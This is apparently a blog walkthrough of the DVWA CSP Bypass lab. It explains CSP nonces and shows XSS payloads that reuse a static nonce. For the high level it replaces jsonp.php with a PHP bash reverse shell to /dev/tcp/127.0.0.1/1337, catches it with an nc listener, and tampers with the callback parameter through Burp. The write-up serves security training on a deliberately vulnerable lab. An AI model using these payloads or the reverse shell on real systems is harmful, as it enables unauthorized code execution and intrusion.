---
title: DVWA - CSP Bypass
date: 2023-12-18
categories: [DVWA]
tags: [dvwa, csp, csp-bypass, burp, xss, javascript, js, php, nonce]
img_path: /assets/dvwa/csp_bypass
published: true
image:
    path: ../dvwa_logo.png
---

## Information

- [How to install dvwa on Kali](https://www.kali.org/tools/dvwa/).
- [Official GitHub repository](https://github.com/digininja/DVWA).

> The DVWA server itself contains instructions about almost everything.

_**Damn Vulnerable Web Application (DVWA)** is a PHP/MySQL web application that is damn vulnerable. Its main goal is to be an aid for security professionals to test their skills and tools in a legal environment, help web developers better understand the processes of securing web applications and to aid both students & teachers to learn about web application security in a controlled class room environment._

_The aim of DVWA is to practice some of the most common web vulnerabilities, with various levels of difficultly, with a simple straightforward interface._

![](dvwa_home.png){: width='70%' }

The DVWA server has **4 different security levels** which can be set as seen below:

![](security_levels.png){: width='70%' }

- **Low**: This security level is completely vulnerable and has no security measures at all. It's use is to be as an example of how web application vulnerabilities manifest through bad coding practices and to serve as a platform to teach or learn basic exploitation techniques.
- **Medium**: This setting is mainly to give an example to the user of bad security practices, where the developer has tried but failed to secure an application. It also acts as a challenge to users to refine their exploitation techniques.
- **High**: This option is an extension to the medium difficulty, with a mixture of harder or alternative bad practices to attempt to secure the code. The vulnerability may not allow the same extent of the exploitation, similar in various Capture The Flags (CTFs) competitions.
- **Impossible**: This level should be secure against all vulnerabilities. It is used to compare the vulnerable source code to the secure source code.

## Content Security Policy (CSP) Bypass

CSP is used to **define where scripts and other resources can be loaded or executed from**. This module will walk you through ways to bypass the policy based on common mistakes made by developers. None of the vulnerabilities are actual vulnerabilities in CSP, they are vulnerabilities in the way it has been implemented.

**Objective**: Bypass Content Security Policy (CSP) and execute JavaScript in the page.

## Security: Low
> _Examine the policy to find all the sources that can be used to host external script files ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_low_source.php))._

> This task has an active issue: [CSP Bypass can't be solved with Hastebin anymore (once again) #539](https://github.com/digininja/DVWA/issues/539)
{: .prompt-warning}

## Security: Medium
> _The CSP policy tries to use a nonce to prevent inline scripts from being added by attackers ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_medium_source.php))._

1. If we have a look at the source code, we will see that a `nonce` has been included:

    ```php
    $headerCSP = "Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';";

    header($headerCSP);

    // Disable XSS protections so that inline alert boxes will work
    header ("X-XSS-Protection: 0");

    # <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
    ```

    Let's find out what exactly [`nonce`](https://blog.mozilla.org/security/2014/10/04/csp-for-the-web-we-have/) is:

    _A CSP with a nonce-source might look like this:_

    `content-security-policy: default-src 'self'; script-src 'nonce-2726c7f26c'`

    And the corresponding document might contain a script element that looks like this:

    ```php
    <script nonce="2726c7f26c">
    alert(123);
    </script>
    ```

    There are 2 things to note here:
    1. It’s important that the nonce changes for each response.
    2. It’s important that the nonce is sufficiently hard to predict.

    _Now, because the nonce changes in a way that isn’t predictable, **the attacker doesn’t know what to inject** and so, by only allowing script (or style) elements with valid nonce attributes, we can be sure that injections will fail._

2. Essentialy, in order to bypass CSP we now need to know the `nonce`'s value. If we try to XSS as usual, it won't work:

    ```javascript
    <script>alert("XSS")</script>
    ```

    ![](medium_xss_fail.png)

3. But if we pass our payload along with the `nonce`'s value, it will work just fine:

    ```javascript
    <script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert("XSS")</script>
    ```

    ![](medium_xss_nonce.png)

## Security: High
> _The page makes a JSONP call to source/jsonp.php passing the name of the function to callback to, you need to modify the jsonp.php script to change the callback function ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_high_source.php))._

### Reverse shell

1. On this level the page makes a call to `jsonp.php` and executes whatever code is there:

    ![](home_high.png)

    ```shell
    $ cat /usr/share/dvwa/vulnerabilities/csp/source/jsonp.php
    <?php
    header("Content-Type: application/json; charset=UTF-8");

    if (array_key_exists ("callback", $_GET)) {
            $callback = $_GET['callback'];
    } else {
            return "";
    }

    $outp = array ("answer" => "15");

    echo $callback . "(".json_encode($outp).")";
    ?>
    ```

2. We can make a backup of this file and replace it with one that contains our code in it, such as a [php reverse shell](https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell):

    ```shell
    $ sudo cp jsonp.php jsonp.php.bak

    $ ls
    high.js  high.php  impossible.js  impossible.php  jsonp_impossible.php  jsonp.php  jsonp.php.bak  low.php  medium.php

    $ cat jsonp.php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'");?>
    ```

3. If we set up a listener and click the *Solve the sum* button, we should be able to catch the reverse shell:

    ```shell
    $  nc -lvnp 1337
    listening on [any] 1337 ...
    ```

    ![](medium_revshell.png)

### Command execution

1. If we click the *Solve the sum* button and intercept the traffic with Burp, we will notice the `callback` parameter:

    ![](high_burp.png)

2. We can modify `callback`'s value by passing a simple payload and then execute our payload by sending the request:

    ![](high_burp2.png)

    ![](high_alert.png)

## Security: Impossible
> _This level is an update of the high level where the JSONP call has its callback function hardcoded and the CSP policy is locked down to only allow external scripts ([Source code](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/dvwa/csp_bypass/csp_bypass_impossible_source.php))._

## Resources

- Cryptocat's [video walkthrough](https://www.youtube.com/watch?v=ERksJHl0DC0).
- [Content Security Policy Reference](https://content-security-policy.com/).
- Mozilla's [CSP for the web we have](https://blog.mozilla.org/security/2014/10/04/csp-for-the-web-we-have/).
- PortSwigger's [Content Security Policy](https://portswigger.net/web-security/cross-site-scripting/content-security-policy).